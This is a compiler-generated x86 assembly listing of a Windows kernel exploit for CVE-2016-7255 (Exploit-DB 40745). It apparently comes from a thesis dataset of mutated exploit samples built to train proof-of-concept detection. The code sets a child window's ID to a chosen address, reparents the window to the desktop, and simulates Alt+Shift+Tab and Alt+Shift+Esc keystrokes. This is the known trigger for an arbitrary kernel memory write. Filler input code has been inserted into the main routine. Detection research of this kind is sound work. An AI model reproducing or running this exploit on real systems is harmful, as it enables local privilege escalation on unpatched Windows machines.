; Listing generated by Microsoft (R) Optimizing Compiler Version 19.28.29913.0 

	TITLE	C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255_fuffa.obj
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	___local_stdio_printf_options
PUBLIC	___local_stdio_scanf_options
PUBLIC	__vfprintf_l
PUBLIC	_printf
PUBLIC	__vfscanf_l
PUBLIC	_scanf
PUBLIC	__vsnprintf_l
PUBLIC	__vsnprintf
PUBLIC	_DbgPrint
PUBLIC	__sim_key_down
PUBLIC	__sim_key_up
PUBLIC	__sim_alt_shift_esc
PUBLIC	__sim_alt_shift_tab
PUBLIC	_or_address_value_4
PUBLIC	_wmain
EXTRN	_memset:PROC
EXTRN	__imp__DebugBreak@0:PROC
EXTRN	__imp__OutputDebugStringA@4:PROC
EXTRN	__imp__HeapAlloc@12:PROC
EXTRN	__imp__HeapFree@12:PROC
EXTRN	__imp__GetProcessHeap@0:PROC
EXTRN	__imp__Sleep@4:PROC
EXTRN	__imp__GetModuleHandleW@4:PROC
EXTRN	__imp__GetMessageA@16:PROC
EXTRN	__imp__TranslateMessage@4:PROC
EXTRN	__imp__DispatchMessageA@4:PROC
EXTRN	__imp__DefWindowProcW@16:PROC
EXTRN	__imp__UnregisterClassW@8:PROC
EXTRN	__imp__RegisterClassExW@4:PROC
EXTRN	__imp__CreateWindowExW@48:PROC
EXTRN	__imp__DestroyWindow@4:PROC
EXTRN	__imp__ShowWindow@8:PROC
EXTRN	__imp__SendInput@12:PROC
EXTRN	__imp__SwitchToThisWindow@8:PROC
EXTRN	__imp__SetForegroundWindow@4:PROC
EXTRN	__imp__SetWindowLongA@12:PROC
EXTRN	__imp__GetDesktopWindow@0:PROC
EXTRN	__imp__SetParent@8:PROC
EXTRN	___acrt_iob_func:PROC
EXTRN	___stdio_common_vfprintf:PROC
EXTRN	___stdio_common_vfscanf:PROC
EXTRN	___stdio_common_vsprintf:PROC
EXTRN	_DbgPrintEx:PROC
EXTRN	_memset:PROC
_DATA	SEGMENT
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
COMM	?_OptionsStorage@?1??__local_stdio_scanf_options@@9@9:QWORD							; `__local_stdio_scanf_options'::`2'::_OptionsStorage
_DATA	ENDS
_DATA	SEGMENT
$SG99201 DB	'c', 00H, 'v', 00H, 'e', 00H, '-', 00H, '2', 00H, '0', 00H
	DB	'1', 00H, '6', 00H, '-', 00H, '7', 00H, '2', 00H, '5', 00H, '5'
	DB	00H, 00H, 00H
$SG99202 DB	'c', 00H, 'v', 00H, 'e', 00H, '-', 00H, '2', 00H, '0', 00H
	DB	'1', 00H, '6', 00H, '-', 00H, '7', 00H, '2', 00H, '5', 00H, '5'
	DB	00H, 00H, 00H
$SG99206 DB	'hWndChild = 0x%p', 0aH, 00H
	ORG $+2
$SG99221 DB	'Enter age: ', 00H
$SG99222 DB	'%d', 00H
_DATA	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_person1$ = -12						; size = 8
_personPtr$ = -4					; size = 4
_nArgc$ = 8						; size = 4
_Argv$ = 12						; size = 4
_wmain	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255_fuffa.c
; Line 280
	push	ebp
	mov	ebp, esp
	sub	esp, 12					; 0000000cH
; Line 282
	lea	eax, DWORD PTR _person1$[ebp]
	mov	DWORD PTR _personPtr$[ebp], eax
; Line 285
	push	OFFSET $SG99221
	call	_printf
	add	esp, 4
; Line 286
	mov	ecx, DWORD PTR _personPtr$[ebp]
	push	ecx
	push	OFFSET $SG99222
	call	_scanf
	add	esp, 8
; Line 287
	mov	edx, DWORD PTR _personPtr$[ebp]
	mov	DWORD PTR [edx], 23			; 00000017H
; Line 288
	mov	eax, DWORD PTR _personPtr$[ebp]
	mov	DWORD PTR [eax+4], 54			; 00000036H
$LN4@wmain:
; Line 292
	push	-1
	call	_or_address_value_4
	add	esp, 4
; Line 293
	xor	ecx, ecx
	jne	SHORT $LN4@wmain
; Line 295
	xor	eax, eax
; Line 296
	mov	esp, ebp
	pop	ebp
	ret	0
_wmain	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_stWC$ = -96						; size = 48
_stMsg$ = -48						; size = 28
_pszTitleName$ = -20					; size = 4
_pId$ = -16						; size = 4
_pszClassName$ = -12					; size = 4
_hWndParent$ = -8					; size = 4
_hWndChild$ = -4					; size = 4
_pAddress$ = 8						; size = 4
_or_address_value_4 PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255_fuffa.c
; Line 165
	push	ebp
	mov	ebp, esp
	sub	esp, 96					; 00000060H
; Line 166
	push	48					; 00000030H
	push	0
	lea	eax, DWORD PTR _stWC$[ebp]
	push	eax
	call	_memset
	add	esp, 12					; 0000000cH
; Line 168
	mov	DWORD PTR _hWndParent$[ebp], 0
; Line 169
	mov	DWORD PTR _hWndChild$[ebp], 0
; Line 171
	mov	DWORD PTR _pszClassName$[ebp], OFFSET $SG99201
; Line 172
	mov	DWORD PTR _pszTitleName$[ebp], OFFSET $SG99202
; Line 174
	mov	DWORD PTR _pId$[ebp], 0
; Line 175
	xor	ecx, ecx
	mov	DWORD PTR _stMsg$[ebp], ecx
	mov	DWORD PTR _stMsg$[ebp+4], ecx
	mov	DWORD PTR _stMsg$[ebp+8], ecx
	mov	DWORD PTR _stMsg$[ebp+12], ecx
	mov	DWORD PTR _stMsg$[ebp+16], ecx
	mov	DWORD PTR _stMsg$[ebp+20], ecx
	mov	DWORD PTR _stMsg$[ebp+24], ecx
$LN4@or_address:
; Line 180
	mov	DWORD PTR _stWC$[ebp], 48		; 00000030H
; Line 181
	mov	edx, DWORD PTR __imp__DefWindowProcW@16
	mov	DWORD PTR _stWC$[ebp+8], edx
; Line 182
	mov	eax, DWORD PTR _pszClassName$[ebp]
	mov	DWORD PTR _stWC$[ebp+40], eax
; Line 184
	lea	ecx, DWORD PTR _stWC$[ebp]
	push	ecx
	call	DWORD PTR __imp__RegisterClassExW@4
	movzx	edx, ax
	test	edx, edx
	jne	SHORT $LN7@or_address
; Line 186
	jmp	$LN3@or_address
$LN7@or_address:
; Line 189
	push	0
	push	0
	call	DWORD PTR __imp__GetModuleHandleW@4
	push	eax
	push	0
	push	0
	push	360					; 00000168H
	push	360					; 00000168H
	push	0
	push	0
	push	282001408				; 10cf0000H
	push	0
	mov	eax, DWORD PTR _pszClassName$[ebp]
	push	eax
	push	0
	call	DWORD PTR __imp__CreateWindowExW@48
	mov	DWORD PTR _hWndParent$[ebp], eax
; Line 204
	cmp	DWORD PTR _hWndParent$[ebp], 0
	jne	SHORT $LN8@or_address
; Line 206
	jmp	$LN3@or_address
$LN8@or_address:
; Line 209
	push	0
	push	0
	call	DWORD PTR __imp__GetModuleHandleW@4
	push	eax
	push	0
	mov	ecx, DWORD PTR _hWndParent$[ebp]
	push	ecx
	push	160					; 000000a0H
	push	160					; 000000a0H
	push	0
	push	0
	push	1355743232				; 50cf0000H
	mov	edx, DWORD PTR _pszTitleName$[ebp]
	push	edx
	mov	eax, DWORD PTR _pszClassName$[ebp]
	push	eax
	push	0
	call	DWORD PTR __imp__CreateWindowExW@48
	mov	DWORD PTR _hWndChild$[ebp], eax
; Line 224
	cmp	DWORD PTR _hWndChild$[ebp], 0
	jne	SHORT $LN9@or_address
; Line 226
	jmp	$LN3@or_address
$LN9@or_address:
; Line 232
	mov	ecx, DWORD PTR _pAddress$[ebp]
	sub	ecx, 20					; 00000014H
	mov	DWORD PTR _pId$[ebp], ecx
; Line 235
	mov	edx, DWORD PTR _pId$[ebp]
	push	edx
	push	-12					; fffffff4H
	mov	eax, DWORD PTR _hWndChild$[ebp]
	push	eax
	call	DWORD PTR __imp__SetWindowLongA@12
; Line 237
	mov	ecx, DWORD PTR _hWndChild$[ebp]
	push	ecx
	push	OFFSET $SG99206
	call	_DbgPrint
	add	esp, 8
; Line 238
	call	DWORD PTR __imp__DebugBreak@0
; Line 240
	push	1
	mov	edx, DWORD PTR _hWndParent$[ebp]
	push	edx
	call	DWORD PTR __imp__ShowWindow@8
; Line 242
	call	DWORD PTR __imp__GetDesktopWindow@0
	push	eax
	mov	eax, DWORD PTR _hWndChild$[ebp]
	push	eax
	call	DWORD PTR __imp__SetParent@8
; Line 244
	mov	ecx, DWORD PTR _hWndChild$[ebp]
	push	ecx
	call	DWORD PTR __imp__SetForegroundWindow@4
; Line 246
	push	4
	call	__sim_alt_shift_tab
	add	esp, 4
; Line 248
	push	1
	mov	edx, DWORD PTR _hWndChild$[ebp]
	push	edx
	call	DWORD PTR __imp__SwitchToThisWindow@8
; Line 250
	call	__sim_alt_shift_esc
$LN5@or_address:
; Line 253
	push	0
	push	0
	push	0
	lea	eax, DWORD PTR _stMsg$[ebp]
	push	eax
	call	DWORD PTR __imp__GetMessageA@16
	test	eax, eax
	je	SHORT $LN2@or_address
; Line 255
	lea	ecx, DWORD PTR _stMsg$[ebp]
	push	ecx
	call	DWORD PTR __imp__TranslateMessage@4
; Line 256
	lea	edx, DWORD PTR _stMsg$[ebp]
	push	edx
	call	DWORD PTR __imp__DispatchMessageA@4
; Line 257
	jmp	SHORT $LN5@or_address
$LN2@or_address:
; Line 260
	xor	eax, eax
	jne	$LN4@or_address
$LN3@or_address:
; Line 262
	cmp	DWORD PTR _hWndParent$[ebp], 0
	je	SHORT $LN10@or_address
; Line 264
	mov	ecx, DWORD PTR _hWndParent$[ebp]
	push	ecx
	call	DWORD PTR __imp__DestroyWindow@4
; Line 265
	mov	DWORD PTR _hWndParent$[ebp], 0
$LN10@or_address:
; Line 268
	cmp	DWORD PTR _hWndChild$[ebp], 0
	je	SHORT $LN11@or_address
; Line 270
	mov	edx, DWORD PTR _hWndChild$[ebp]
	push	edx
	call	DWORD PTR __imp__DestroyWindow@4
; Line 271
	mov	DWORD PTR _hWndChild$[ebp], 0
$LN11@or_address:
; Line 274
	push	0
	call	DWORD PTR __imp__GetModuleHandleW@4
	push	eax
	mov	eax, DWORD PTR _pszClassName$[ebp]
	push	eax
	call	DWORD PTR __imp__UnregisterClassW@8
; Line 276
	xor	eax, eax
; Line 277
	mov	esp, ebp
	pop	ebp
	ret	0
_or_address_value_4 ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_hWnd$ = -12						; size = 4
_nFinalRet$ = -8					; size = 4
_i$ = -4						; size = 4
_nCount$ = 8						; size = 4
__sim_alt_shift_tab PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255_fuffa.c
; Line 132
	push	ebp
	mov	ebp, esp
	sub	esp, 12					; 0000000cH
; Line 133
	mov	DWORD PTR _i$[ebp], 0
; Line 134
	mov	DWORD PTR _hWnd$[ebp], 0
; Line 137
	mov	DWORD PTR _nFinalRet$[ebp], -1
$LN4@sim_alt_sh:
; Line 141
	push	18					; 00000012H
	call	__sim_key_down
	add	esp, 4
; Line 142
	push	16					; 00000010H
	call	__sim_key_down
	add	esp, 4
; Line 145
	mov	DWORD PTR _i$[ebp], 0
	jmp	SHORT $LN7@sim_alt_sh
$LN5@sim_alt_sh:
	mov	eax, DWORD PTR _i$[ebp]
	add	eax, 1
	mov	DWORD PTR _i$[ebp], eax
$LN7@sim_alt_sh:
	mov	ecx, DWORD PTR _i$[ebp]
	cmp	ecx, DWORD PTR _nCount$[ebp]
	jge	SHORT $LN6@sim_alt_sh
; Line 147
	push	9
	call	__sim_key_down
	add	esp, 4
; Line 148
	push	9
	call	__sim_key_up
	add	esp, 4
; Line 150
	push	1000					; 000003e8H
	call	DWORD PTR __imp__Sleep@4
; Line 152
	jmp	SHORT $LN5@sim_alt_sh
$LN6@sim_alt_sh:
; Line 155
	push	18					; 00000012H
	call	__sim_key_up
	add	esp, 4
; Line 156
	push	16					; 00000010H
	call	__sim_key_up
	add	esp, 4
; Line 157
	xor	edx, edx
	jne	SHORT $LN4@sim_alt_sh
; Line 159
	mov	eax, DWORD PTR _nFinalRet$[ebp]
; Line 160
	mov	esp, ebp
	pop	ebp
	ret	0
__sim_alt_shift_tab ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_i$ = -4						; size = 4
__sim_alt_shift_esc PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255_fuffa.c
; Line 105
	push	ebp
	mov	ebp, esp
	push	ecx
; Line 106
	mov	DWORD PTR _i$[ebp], 0
$LN4@sim_alt_sh:
; Line 110
	push	18					; 00000012H
	call	__sim_key_down
	add	esp, 4
; Line 111
	push	16					; 00000010H
	call	__sim_key_down
	add	esp, 4
; Line 114
	push	27					; 0000001bH
	call	__sim_key_down
	add	esp, 4
; Line 115
	push	27					; 0000001bH
	call	__sim_key_up
	add	esp, 4
; Line 117
	push	27					; 0000001bH
	call	__sim_key_down
	add	esp, 4
; Line 118
	push	27					; 0000001bH
	call	__sim_key_up
	add	esp, 4
; Line 120
	push	18					; 00000012H
	call	__sim_key_up
	add	esp, 4
; Line 121
	push	16					; 00000010H
	call	__sim_key_up
	add	esp, 4
; Line 124
	xor	eax, eax
	jne	SHORT $LN4@sim_alt_sh
; Line 126
	xor	eax, eax
; Line 127
	mov	esp, ebp
	pop	ebp
	ret	0
__sim_alt_shift_esc ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_stInput$ = -28						; size = 28
_wKey$ = 8						; size = 2
__sim_key_up PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255_fuffa.c
; Line 88
	push	ebp
	mov	ebp, esp
	sub	esp, 28					; 0000001cH
; Line 89
	xor	eax, eax
	mov	DWORD PTR _stInput$[ebp], eax
	mov	DWORD PTR _stInput$[ebp+4], eax
	mov	DWORD PTR _stInput$[ebp+8], eax
	mov	DWORD PTR _stInput$[ebp+12], eax
	mov	DWORD PTR _stInput$[ebp+16], eax
	mov	DWORD PTR _stInput$[ebp+20], eax
	mov	DWORD PTR _stInput$[ebp+24], eax
$LN4@sim_key_up:
; Line 93
	mov	DWORD PTR _stInput$[ebp], 1
; Line 94
	mov	cx, WORD PTR _wKey$[ebp]
	mov	WORD PTR _stInput$[ebp+4], cx
; Line 95
	mov	DWORD PTR _stInput$[ebp+8], 2
; Line 97
	push	28					; 0000001cH
	lea	edx, DWORD PTR _stInput$[ebp]
	push	edx
	push	1
	call	DWORD PTR __imp__SendInput@12
; Line 99
	xor	eax, eax
	jne	SHORT $LN4@sim_key_up
; Line 101
	xor	eax, eax
; Line 102
	mov	esp, ebp
	pop	ebp
	ret	0
__sim_key_up ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_stInput$ = -28						; size = 28
_wKey$ = 8						; size = 2
__sim_key_down PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255_fuffa.c
; Line 71
	push	ebp
	mov	ebp, esp
	sub	esp, 28					; 0000001cH
; Line 72
	xor	eax, eax
	mov	DWORD PTR _stInput$[ebp], eax
	mov	DWORD PTR _stInput$[ebp+4], eax
	mov	DWORD PTR _stInput$[ebp+8], eax
	mov	DWORD PTR _stInput$[ebp+12], eax
	mov	DWORD PTR _stInput$[ebp+16], eax
	mov	DWORD PTR _stInput$[ebp+20], eax
	mov	DWORD PTR _stInput$[ebp+24], eax
$LN4@sim_key_do:
; Line 76
	mov	DWORD PTR _stInput$[ebp], 1
; Line 77
	mov	cx, WORD PTR _wKey$[ebp]
	mov	WORD PTR _stInput$[ebp+4], cx
; Line 78
	mov	DWORD PTR _stInput$[ebp+8], 0
; Line 80
	push	28					; 0000001cH
	lea	edx, DWORD PTR _stInput$[ebp]
	push	edx
	push	1
	call	DWORD PTR __imp__SendInput@12
; Line 82
	xor	eax, eax
	jne	SHORT $LN4@sim_key_do
; Line 84
	xor	eax, eax
; Line 85
	mov	esp, ebp
	pop	ebp
	ret	0
__sim_key_down ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_ulRet$ = -12						; size = 4
_VaList$ = -8						; size = 4
_pszDbgBuff$ = -4					; size = 4
_Format$ = 8						; size = 4
_DbgPrint PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_40745_cve_id_CVE-2016-7255_fuffa.c
; Line 35
	push	ebp
	mov	ebp, esp
	sub	esp, 12					; 0000000cH
; Line 36
	mov	DWORD PTR _pszDbgBuff$[ebp], 0
; Line 37
	mov	DWORD PTR _VaList$[ebp], 0
; Line 38
	mov	DWORD PTR _ulRet$[ebp], 0
$LN4@DbgPrint:
; Line 42
	push	1024					; 00000400H
	push	0
	call	DWORD PTR __imp__GetProcessHeap@0
	push	eax
	call	DWORD PTR __imp__HeapAlloc@12
	mov	DWORD PTR _pszDbgBuff$[ebp], eax
; Line 43
	cmp	DWORD PTR _pszDbgBuff$[ebp], 0
	jne	SHORT $LN5@DbgPrint
; Line 45
	jmp	SHORT $LN3@DbgPrint
$LN5@DbgPrint:
; Line 47
	push	1024					; 00000400H
	push	0
	mov	eax, DWORD PTR _pszDbgBuff$[ebp]
	push	eax
	call	_memset
	add	esp, 12					; 0000000cH
; Line 49
	lea	ecx, DWORD PTR _Format$[ebp+4]
	mov	DWORD PTR _VaList$[ebp], ecx
; Line 51
	mov	edx, DWORD PTR _VaList$[ebp]
	push	edx
	mov	eax, DWORD PTR _Format$[ebp]
	push	eax
	push	1023					; 000003ffH
	mov	ecx, DWORD PTR _pszDbgBuff$[ebp]
	push	ecx
	call	__vsnprintf
	add	esp, 16					; 00000010H
; Line 53
	mov	edx, DWORD PTR _pszDbgBuff$[ebp]
	push	edx
	push	0
	push	77					; 0000004dH
	call	_DbgPrintEx
	add	esp, 12					; 0000000cH
; Line 54
	mov	eax, DWORD PTR _pszDbgBuff$[ebp]
	push	eax
	call	DWORD PTR __imp__OutputDebugStringA@4
; Line 56
	mov	DWORD PTR _VaList$[ebp], 0
; Line 58
	xor	ecx, ecx
	jne	SHORT $LN4@DbgPrint
$LN3@DbgPrint:
; Line 60
	cmp	DWORD PTR _pszDbgBuff$[ebp], 0
	je	SHORT $LN6@DbgPrint
; Line 62
	mov	edx, DWORD PTR _pszDbgBuff$[ebp]
	push	edx
	push	0
	call	DWORD PTR __imp__GetProcessHeap@0
	push	eax
	call	DWORD PTR __imp__HeapFree@12
; Line 63
	mov	DWORD PTR _pszDbgBuff$[ebp], 0
$LN6@DbgPrint:
; Line 66
	mov	eax, DWORD PTR _ulRet$[ebp]
; Line 67
	mov	esp, ebp
	pop	ebp
	ret	0
_DbgPrint ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vsnprintf
_TEXT	SEGMENT
__Buffer$ = 8						; size = 4
__BufferCount$ = 12					; size = 4
__Format$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vsnprintf PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 1411
	push	ebp
	mov	ebp, esp
; Line 1412
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	push	0
	mov	ecx, DWORD PTR __Format$[ebp]
	push	ecx
	mov	edx, DWORD PTR __BufferCount$[ebp]
	push	edx
	mov	eax, DWORD PTR __Buffer$[ebp]
	push	eax
	call	__vsnprintf_l
	add	esp, 20					; 00000014H
; Line 1413
	pop	ebp
	ret	0
__vsnprintf ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vsnprintf_l
_TEXT	SEGMENT
tv74 = -8						; size = 4
__Result$ = -4						; size = 4
__Buffer$ = 8						; size = 4
__BufferCount$ = 12					; size = 4
__Format$ = 16						; size = 4
__Locale$ = 20						; size = 4
__ArgList$ = 24						; size = 4
__vsnprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 1391
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 1392
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __BufferCount$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Buffer$[ebp]
	push	ecx
	call	___local_stdio_printf_options
	mov	edx, DWORD PTR [eax]
	or	edx, 1
	mov	eax, DWORD PTR [eax+4]
	push	eax
	push	edx
	call	___stdio_common_vsprintf
	add	esp, 28					; 0000001cH
	mov	DWORD PTR __Result$[ebp], eax
; Line 1396
	cmp	DWORD PTR __Result$[ebp], 0
	jge	SHORT $LN3@vsnprintf_
	mov	DWORD PTR tv74[ebp], -1
	jmp	SHORT $LN4@vsnprintf_
$LN3@vsnprintf_:
	mov	ecx, DWORD PTR __Result$[ebp]
	mov	DWORD PTR tv74[ebp], ecx
$LN4@vsnprintf_:
	mov	eax, DWORD PTR tv74[ebp]
; Line 1397
	mov	esp, ebp
	pop	ebp
	ret	0
__vsnprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _scanf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Format$ = 8						; size = 4
_scanf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 1282
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 1285
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 1286
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	push	0
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	__vfscanf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 1287
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 1288
	mov	eax, DWORD PTR __Result$[ebp]
; Line 1289
	mov	esp, ebp
	pop	ebp
	ret	0
_scanf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vfscanf_l
_TEXT	SEGMENT
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vfscanf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 1064
	push	ebp
	mov	ebp, esp
; Line 1065
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	___local_stdio_scanf_options
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	mov	edx, DWORD PTR [eax]
	push	edx
	call	___stdio_common_vfscanf
	add	esp, 24					; 00000018H
; Line 1068
	pop	ebp
	ret	0
__vfscanf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _printf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Format$ = 8						; size = 4
_printf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 956
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 959
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 960
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	push	1
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	__vfprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 961
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 962
	mov	eax, DWORD PTR __Result$[ebp]
; Line 963
	mov	esp, ebp
	pop	ebp
	ret	0
_printf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vfprintf_l
_TEXT	SEGMENT
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vfprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 644
	push	ebp
	mov	ebp, esp
; Line 645
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	___local_stdio_printf_options
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	mov	edx, DWORD PTR [eax]
	push	edx
	call	___stdio_common_vfprintf
	add	esp, 24					; 00000018H
; Line 646
	pop	ebp
	ret	0
__vfprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ___local_stdio_scanf_options
_TEXT	SEGMENT
___local_stdio_scanf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 100
	push	ebp
	mov	ebp, esp
; Line 102
	mov	eax, OFFSET ?_OptionsStorage@?1??__local_stdio_scanf_options@@9@9 ; `__local_stdio_scanf_options'::`2'::_OptionsStorage
; Line 103
	pop	ebp
	ret	0
___local_stdio_scanf_options ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ___local_stdio_printf_options
_TEXT	SEGMENT
___local_stdio_printf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 90
	push	ebp
	mov	ebp, esp
; Line 92
	mov	eax, OFFSET ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 ; `__local_stdio_printf_options'::`2'::_OptionsStorage
; Line 93
	pop	ebp
	ret	0
___local_stdio_printf_options ENDP
_TEXT	ENDS
END
